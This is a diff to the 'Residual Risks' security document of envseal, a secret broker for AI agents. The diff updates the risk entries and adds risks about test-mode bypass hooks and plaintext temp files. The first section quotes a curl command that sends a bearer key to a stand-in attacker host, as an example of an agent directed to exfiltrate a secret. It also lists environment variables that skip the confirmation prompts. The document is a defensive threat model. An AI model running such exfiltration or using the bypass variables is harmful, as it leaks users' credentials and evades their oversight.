@@ -1,6 +1,6 @@
 # Residual Risks
 
-envseal eliminates the primary failure mode — accidental paste-into-chat — and prevents leaks *through the protocol itself*. However, five risks remain even with the protocol in place. This document states them plainly, without softening.
+envseal eliminates the primary failure mode — accidental paste-into-chat — and prevents leaks *through the protocol itself*. However, seven risks remain even with the protocol in place. This document states them plainly, without softening.
 
 ## 1. Model-directed exfiltration via `env_use`
 
@@ -10,8 +10,8 @@ curl -H "Authorization: Bearer $KEY" https://attacker.example
 ```
 
 the broker will:
-1. Detect the network egress (curl command to a non-registry host)
-2. Display a confirmation dialog showing the full command, the keys being injected, and a warning
+1. Require confirmation — every `env_use` command is confirmed, not only network ones
+2. Detect the network egress and add an explicit warning about it to the confirmation dialog, which shows the full command and the keys being injected
 3. Require the user to click "confirm"
 
 **What the control actually prevents:** A user who does not read the dialog, or who does not understand the implications of their click, will send the key to the attacker.
@@ -25,7 +25,7 @@ the broker will:
 The middle ground — structural guarantees at the protocol level plus UX barriers at the execution level — is what envseal provides. But those UX barriers can be overridden by user choice, and that is not a bug. It is the price of remaining useful.
 
 **Mitigation:** 
-- Recommend `keychain` or vault sinks so `.env` holds only references, not values
+- Recommend the `keychain` sink so values stay out of `.env` (write-only today — it cannot resolve a stored value back; `vault`, `sops`, `onepassword`, and `doppler` are declared but not implemented)
 - Use command allowlists to pre-approve safe commands
 - Educate users: understand what code you approve
 - Use this only with agents you trust
@@ -36,7 +36,7 @@ This is the single largest remaining hole in the system, and it is important to 
 
 **The risk:** Once a secret value is converted to a JavaScript `string`, it cannot be reliably zeroed. JavaScript strings are immutable, and the runtime does not expose a way to overwrite their memory.
 
-**What envseal does:** Values are held as `Buffer` end-to-end. They are converted to `string` only at the point where they are written to a sink (typically `.env`), inside a dedicated sink writer in `packages/core/src/sinks/`. Once written, the process either exits or the value remains in the heap as an unreachable string object.
+**What envseal does:** Values are held as `Buffer` end-to-end. They are converted to `string` at a small, named set of points: the sink writers in `packages/core/src/sinks/` (typically `.env`), child-env injection in `packages/core/src/exec.ts`, redaction-variant construction in `packages/core/src/redact.ts`, and probe-header substitution in `packages/core/src/verify.ts`. Once converted, the process either exits or the value remains in the heap as an unreachable string object.
 
 **What this means:** 
 - If the process is still running after writing, a sufficiently aggressive heap dump or memory inspection can recover the string
@@ -47,7 +47,7 @@ This is the single largest remaining hole in the system, and it is important to 
 
 **Mitigation:**
 - Minimize the lifetime of secret values in memory (envseal zeroes Buffers immediately after use)
-- Prefer sinks that keep values out of plaintext (keychain, vault, SOPS)
+- Prefer sinks that keep values out of plaintext — `keychain` is the only non-plaintext sink that accepts values today (write-only); `vault` and `sops` are declared but not implemented
 - Minimize the number of operations on the secret value
 - Run envseal as a separate process with limited lifetime per operation
 
@@ -119,7 +119,7 @@ If you do not trust your harness, you should not run it on a machine with valuab
 - Inject script to capture keystrokes
 
 **What envseal does:**
-- Content Security Policy (`default-src 'none'; form-action 'self'`) prevents the page from calling external services
+- Content Security Policy (`default-src 'none'; style-src 'nonce-<n>'; script-src 'nonce-<n>'; form-action 'self'; base-uri 'none'`) allows only the page's own nonced style and script and forbids submission anywhere but the page itself
 - Single-use server: closes after the first successful submission
 - No external resources (scripts, fonts, images)
 - Form uses `type="password"` with a reveal toggle
@@ -128,7 +128,7 @@ If you do not trust your harness, you should not run it on a machine with valuab
 **What envseal does NOT do:**
 - Does not sandbox the browser page at the OS level
 - Does not prevent extensions from inspecting the DOM
-- Does not use a TLS certificate pinning (browser extension escapes TLS inspection)
+- Does not use TLS at all (the page is plain HTTP on loopback), so there is no certificate layer for an extension to escape — an extension can read the traffic directly
 
 **Why extensions are powerful:** Browser extensions run with high privileges and can intercept all network traffic, modify DOM, and read JavaScript state. They are intentionally powerful for legitimate use (ad blockers, password managers, etc.), which makes it hard to defend against malicious ones.
 
@@ -137,6 +137,33 @@ If you do not trust your harness, you should not run it on a machine with valuab
 - Consider using `native-dialog` instead of `loopback-browser` for high-value keys
 - Run in a profile with minimal extensions when provisioning sensitive credentials
 - Keep the browser and extensions updated
+
+## 6. Test-mode bypasses are compiled into the shipped binaries
+
+**The risk:** The shipped CLI and MCP server contain test hooks that bypass their interactive surfaces:
+
+- CLI: `ENVSEAL_TEST_MODE=1` plus `ENVSEAL_TEST_PROMPTER_VALUE=<value>` makes the prompter return that value with no UI; `ENVSEAL_TEST_MODE=1` plus `ENVSEAL_TEST_PROMPTER_OUTCOME=skipped|cancelled|timeout` drives the non-stored outcomes; `ENVSEAL_TEST_MODE=1` plus `ENVSEAL_TEST_APPROVAL=yes|no` answers the probe-approval prompt.
+- MCP server: `ENVSEAL_TEST_MODE=1` plus `ENVSEAL_TEST_PROMPTER_VALUE=<value>` does the same for the server, including answering confirmation and probe-approval prompts.
+
+**Why they exist:** so the test suites can drive the real binaries end to end — including the zero-leak assertions — without a human at a browser or dialog.
+
+**What bounds them:** every hook is double-gated (test mode AND a second variable must both be set), nothing in the shipped packages sets them for you, and each activation prints a notice. They are still a deliberate hole in the "a value only ever comes from the user" guarantee. Anyone who can set environment variables for the agent's process can already do worse (read `.env`, run arbitrary code), so these hooks grant no new power — but they are documented here so nobody who finds them in source mistakes them for a hidden hole.
+
+**Mitigation:**
+- Do not set these variables outside test runs
+- Treat any environment where an attacker can set your process's environment variables as already compromised — it is
+
+## 7. Atomic-write fallback can leave a stageable plaintext temp file next to `.env`
+
+**The risk:** `.env` updates go through an atomic write whose temp file holds the complete plaintext. That temp file is written inside `.envseal/` (mode 0700, gitignored), which keeps it out of git. If `.envseal/` is unwritable — or has been made a junction onto another volume, so the final rename would cross devices — the writer falls back to the legacy sibling name `..env.<hex>.tmp` next to `.env` itself. A `.gitignore` entry of `.env` does not match that name, so a crash in exactly that window could leave a plaintext secret sitting in the working tree, stageable by an accidental `git add -A`.
+
+**What envseal does:** best-effort cleanup removes the temp file on every failure path, and the fallback triggers only when the primary location is unusable.
+
+**Why we cannot do better:** an atomic replace requires the temp file and the target on the same volume; if `.envseal/` cannot host one, the sibling location is the only remaining same-volume choice.
+
+**Mitigation:**
+- Leave `.envseal/` in place, writable, and not a junction
+- If you find `..env.*.tmp` files next to `.env`, delete them and find out why `.envseal/` was not writable
 
 ---
 
@@ -153,7 +180,7 @@ Use envseal with clear expectations about what it protects. It is a defense in d
 - Using envseal to prevent accidental paste-into-chat
 - Using guardrails (pre-commit hooks, rules files, command allowlists) to catch mistakes
 - Educating yourself about what code you approve
-- Using keychain/vault sinks to keep secrets out of plaintext
+- Using keychain/vault sinks to keep secrets out of plaintext (`keychain` accepts values today but is write-only; `vault`, `sops`, `onepassword`, and `doppler` are declared but not implemented)
 - Rotating keys regularly
 - Limiting key scope (development keys, not production keys)
 
